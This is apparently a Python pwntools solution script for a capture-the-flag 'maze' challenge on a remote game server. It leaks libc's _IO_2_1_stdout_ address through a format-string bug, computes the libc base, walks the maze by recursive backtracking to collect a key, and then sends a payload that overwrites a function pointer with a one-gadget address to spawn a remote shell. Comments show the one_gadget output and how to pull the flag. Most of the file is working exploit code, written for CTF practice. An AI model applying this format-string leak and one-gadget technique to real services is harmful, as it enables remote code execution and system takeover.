from pwn import *
# Please use maze.py - beware: ugly code

#def goToUserInput():
#    r.sendline("exit")
#    r.recvuntil(">")
#    r.sendline("1")
#    return r.recvuntil(">")

'''
Set a username (which is a format string in fact),
start the game and execute the "whoami" command
The answer of the game will contain the memory address chosen in the format string
'''
def leakaddr(fmtstr):
    r.sendline(fmtstr)
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(">")
    r.sendline("whoami")
    return r.recvuntil(">")

'''
Checks which directions are possible to walk from the current position
Caches the found information.
Clumsy implementation but it works
'''
def checkDir(r, maze, posy, posx):
    if checked[posy][posx] == 1:
        return ""
    possible = {}
    # print("I am at ", posy, posx)
    for d in ['north', 'east', 'south', 'west']:
        #       print("trying ", d)
        r.sendline("go {0}".format(d))
        ans = r.recvuntil(">")
        possible[d] = not "wall" in ans
        # Undo move
        # When we were able to walk one step in a certain direction
        # i.e. no "You hit a wall" message, we'll have to UNDO the step again
        # to end up on the same position where we checked the possibilities from
        if not "wall" in ans:
            # print("Stepped ok, undoing")
            if d == "north":
                r.sendline("go south")
            elif d == "east":
                r.sendline("go west")
            elif d == "south":
                r.sendline("go north")
            else:
                r.sendline("go east")
            ans = r.recvuntil(">")
    # Updates the in-memory copy of the maze with the
    # information which steps are possible (0 = there is a path in that direction)
    # If we have already seen that particular place before (value == 3), we do not
    # overwrite the value

    # print("Setting values, relative to ",posy,posx)
    if possible["north"]:
        #        print("Opened north")
        if maze[posy - 1][posx] != 3:
            maze[posy - 1][posx] = 0
    if possible["east"]:
        #        print("Opened east")
        if maze[posy][posx + 1] != 3:
            maze[posy][posx + 1] = 0
    if possible["south"]:
        #        print("Opened south")
        if maze[posy + 1][posx] != 3:
            maze[posy + 1][posx] = 0
    if possible["west"]:
        #        print("Opened west")
        if maze[posy][posx - 1] != 3:
            maze[posy][posx - 1] = 0
    #       print(possible)
    # Mark the current square as resolved
    checked[posy][posx] = 1
    return ans

'''
Draws an ASCII art variant of the maze
based on the local in-memory copy
'''
def printMaze(maze):
    # print("Current character pos: ", posy, posx)
    row = -1
    col = -1
    for y in maze:
        row += 1
        s = ""
        col = -1
        for x in y:
            col += 1
            # Draw a wall
            if x == 1:
                xp = chr(219)
            # Draw an open path
            elif x == 0:
                xp = " "
            # Draw an already seen path
            else:
                xp = "."
            # Draw the player
            if col == posx and row == posy:
                xp = "@"
            s += str(xp)
        print(s)

'''
Main game loop
Walk one step in the given direction and search that square
If the search returns the key, we pick it up and store it in variable key.
If the search returns a chest, we open it if we have already found the key

'''
def godirect(direct):
    global posx
    global posy
    global key
    if direct == "north":
        r.sendline("go north")
        posy -= 1
    elif direct == "south":
        r.sendline("go south")
        posy += 1
    elif direct == "east":
        r.sendline("go east")
        posx += 1
    else:
        r.sendline("go west")
        posx -= 1
    ans = r.recvuntil(">")
    print(ans)
    # Send search command
    r.sendline("search")
    ans = r.recvuntil(">")
    print(ans)
    # Have we found a key?
    if "You found a key!" in ans:
        # Only pick it up the first time and not on re-visit
        if key == None:
            r.sendline("pick up")
            ans = r.recvuntil(">")
            if "You pick up the key" in ans:
                # Extract the exact key value in the answer
                key = ans.split(":")[1]
                key = key.strip()
                key = key[:32]

                print("I FOUND THE KEY!!", key)
                # waitKey()
            else:
                print(ans)
                # waitKey()
    # Have we found the chest?
    if "You found a locked chest!" in ans:
        print(ans)
        print("I FOUND THE CHEST!")
        # waitKey()
        # Do we have the key?
        if key != None:
            r.sendline("open")
            ans = r.recvuntil(">")
            if "The chest is locked. Please enter the key:":
                print("SEND KEY AND PAYLOAD!")
                pay = key
                onegadget_addr = LIBC_BASE_ADDR + OFFSET_ONE_GADGET
                print("Patching function table for 'error()' to address {0}".format(hex(onegadget_addr)))
                pay += p64(onegadget_addr)
                r.sendline(pay)
                ans = r.recvuntil("Press enter to return to the menue")
                print(ans)
                r.interactive()
                # Go back to menu
                # Choose "0" (invalid option) to trigger the "error" function
                # which in turn dispatches into our "one gadget"
                # The flag is in /home/maze/egg.png and it can be transferred via
                # cat egg.png | base64 and then copy/paste for example
        else:
            print("But I don't have a key yet...")
            # waitKey()
    printMaze(maze)

'''
Helper function to wiat for a key press of the user
'''
def waitKey():
    print("Press a key to continue")
    sys.stdin.read(1)

def search(r, maze, y, x, direct):
    global posy
    global posx
    # print("Trying ", y, x)
    #        sys.stdin.read(1)
    print(checkDir(r, maze, posy, posx))
    if maze[y][x] == 1:
        return False
    if maze[y][x] == 3:
        return False
    maze[y][x] = 3
    godirect(direct)
    oldposy = posy
    oldposx = posx
    posy = y
    posx = x
    # printMaze(maze)
    if search(r, maze, y, x + 1, "east") or search(r, maze, y + 1, x, "south") or search(r, maze, y, x - 1,
                                                                                         "west") or search(r, maze,
                                                                                                           y - 1, x,
                                                                                                           "north"):
        print("Did one step")
        return True
    print("Did not find a step,need to backtrack")
    if direct == "north":
        godirect("south")
    elif direct == "south":
        godirect("north")
    elif direct == "east":
        godirect("west")
    elif direct == "west":
        godirect("east")

    return False


# Set run_local to true to play with a local instance
# Tested with Ubuntu 18.04.2 LTS 64 Bit with libc6_2.27-3ubuntu1_amd64.so
# sha1sum(libc6)=18292bd12d37bfaf58e8dded9db7f1f5da1192cb
#

run_local = False

if run_local:
        # Network-ify binary using socat:
        # socat TCP-LISTEN:2323,reuseaddr EXEC:./maze
        URL = "localhost"
        PORT = 2323
        # Where can be find a suitable "one gadget"?
        # See https://github.com/david942j/one_gadget for details what this is
        #
        # daubsi@bentobox:~$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
        # 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
        # constraints:
        #   rcx == NULL
        #
        # 0x4f322 execve("/bin/sh", rsp+0x40, environ)
        # constraints:
        #   [rsp+0x40] == NULL
        #
        # 0x10a38c execve("/bin/sh", rsp+0x70, environ)
        # constraints:
        #   [rsp+0x70] == NULL
        #
        # Via trial and error we identify the variant at 0x10a38c as the only one
        # where the constraints are fulfilled
        OFFSET_ONE_GADGET = 0x10a38c
        # Special format string to point to _IO_2_1_stdout_ reference on stack (depends on libc version!)
        FMTSTRING = "%7$1x"
        # Offset of function _IO_2_1_stdout_ from start of libc
        STDOUT_OFFSET = 0x3ec760
else:   # Settings for CTF server (the real thing!)
        URL = "whale.hacking-lab.com"
        PORT = 7331
        OFFSET_ONE_GADGET = 0xf1147
        FMTSTRING = "%10$lx"
        STDOUT_OFFSET = 0x3C5620

# The chest key

key = None

# Connect to game server
r = remote(URL, PORT)

r.recvuntil(">")

# Send format string exploit in username
print("Determining addr of libc_2.23.so:_IO_2_1_stdout_")

# We leak the memory address of _IO_2_1_stdout using our carefully chosen format string when
# executing the "whoami" command  which contains format string vulnerability
ans10 = leakaddr("|{0}|\n".format(FMTSTRING))  # addr of _IO_2_1_stdout_
ans10 = ans10.split("|")[1]

STDOUT_ADDR = int(ans10, 16)
STDOUT_ADDR_STR = hex(STDOUT_ADDR)

print("Stack value: {0} (libc's _IO_2_1_stdout_)".format(STDOUT_ADDR_STR))
print("Using libc's '_IO_2_1_stdout_ to calculate base of libc'")
print("_IO_2_1_stdout_ is {0} bytes away from start of libc".format(hex(STDOUT_OFFSET)))

LIBC_BASE_ADDR = STDOUT_ADDR - STDOUT_OFFSET
LIBC_BASE_ADDR_STR = hex(LIBC_BASE_ADDR)
print("Found base of libc: {0}".format(LIBC_BASE_ADDR_STR))

waitKey()

print("Starting game")

# Send "Play"
r.sendline("3")
ans = r.recvuntil(">")

# Build an in-memory variant of the maze
dim = 50
maze = [[1] * dim for x in xrange(dim)]
# Build a "cache table" which flags which squares already have been discovered
# This is probably unnecessary and we could do w/o.
checked = [[0] * dim for x in xrange(dim)]

# Start position (arbitrary, right in the middle so we have enough space no matter where the maze grows to
posx = dim / 2
posy = dim / 2

# Initialize current pos as "path"
maze[posy][posx] = 0

# Print the starting position on server
print(ans)
# Print local in-memory copy
printMaze(maze)

while True:
    # Find the directions possible from the starting square
    checkDir(r, maze, posy, posx)
    # printMaze(maze)
    # First step and recurse
    if maze[posy][posx + 1] == 0:
        search(r, maze, posy, posx + 1, "east")
    elif maze[posy - 1][posx] == 0:
        search(r, maze, posy - 1, posx, "north")
    elif maze[posy][posx - 1] == 0:
        search(r, maze, posy, posx - 1, "west")
    else:
        search(r, maze, posy + 1, posx, "south")

    # It can happen that the chest is discovered first in one branch
    # and the key is in another branch. In this constellation, we will never
    # visit again the branch with the chest and thus cannot solve
    # Therefore, if we return to the start, we run once again and forget about
    # already visited fields

    print("Restarting the recursive walk!")
    waitKey()
    maze = [[1] * dim for x in xrange(dim)]



